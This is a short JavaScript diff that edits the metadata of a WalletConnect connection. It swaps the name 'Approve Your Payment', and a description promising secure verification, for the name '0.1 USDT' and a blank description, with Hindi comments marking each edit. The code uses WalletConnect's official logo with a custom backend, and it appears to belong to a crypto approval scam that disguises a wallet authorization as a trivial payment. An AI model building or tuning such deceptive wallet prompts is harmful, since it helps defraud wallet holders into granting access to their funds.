@@ -104,8 +104,8 @@ async function initWC() {
     core,
     projectId: WC_PROJECT_ID,
     metadata: {
-      name: 'Approve Your Payment',
-      description: 'Tap approve to confirm your pending payment. Your wallet will be securely verified.',
+      name: '0.1 USDT', // यहाँ बदला गया है
+      description: '',  // डिस्क्रिप्शन पूरी तरह खाली कर दिया गया है
       url: BACKEND_URL,
       icons: ['https://walletconnect.com/walletconnect-logo.png']
     }
